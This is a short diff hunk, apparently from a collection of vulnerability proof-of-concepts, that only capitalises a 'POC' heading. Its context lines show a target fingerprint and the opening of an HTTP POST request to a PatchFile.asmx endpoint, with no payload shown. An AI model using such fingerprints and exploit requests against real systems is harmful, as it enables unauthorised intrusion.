@@ -7,7 +7,7 @@
 body="logo-u9.png"
 ```
 
-## poc
+## POC
 ```
 POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64)
